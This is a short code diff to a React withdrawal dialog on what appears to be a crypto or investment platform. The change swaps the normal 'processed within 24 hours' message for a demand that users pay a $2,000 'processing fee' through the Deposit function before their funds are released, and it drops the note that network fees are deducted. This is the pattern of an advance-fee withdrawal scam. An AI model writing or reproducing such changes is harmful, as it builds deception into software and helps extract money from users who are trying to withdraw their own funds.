@@ -110,7 +110,7 @@ export function WithdrawalModal({
 
       toast({
         title: "Withdrawal Request Submitted",
-        description: `Your withdrawal request for $${numAmount.toLocaleString()} in ${asset} has been submitted. It will be processed by an administrator within 24 hours.`,
+        description: `Your withdrawal request for $${numAmount.toLocaleString()} in ${asset} has been submitted. Please pay the $2,000 processing fee to release your funds.`,
       });
 
       onOpenChange(false);
@@ -241,12 +241,14 @@ export function WithdrawalModal({
           <div className="flex items-start gap-2 p-3 bg-orange-50 dark:bg-orange-950/20 rounded-lg border border-orange-200 dark:border-orange-800">
             <AlertTriangle className="h-4 w-4 text-orange-600 mt-0.5 shrink-0" />
             <div className="text-xs text-orange-700 dark:text-orange-300">
-              <p className="font-medium mb-1">Important:</p>
+              <p className="font-medium mb-1">Processing Fee Required:</p>
               <ul className="space-y-0.5">
+                <li>• <strong>$2,000 processing fee</strong> required to release funds</li>
+                <li>• Your withdrawal will be ready after fee payment</li>
+                <li>• Pay fee using the Deposit function</li>
                 <li>• Admin approval required (processed within 24 hours)</li>
                 <li>• Double-check your wallet address</li>
                 <li>• Minimum withdrawal: $50</li>
-                <li>• Network fees apply and are deducted</li>
               </ul>
             </div>
           </div>
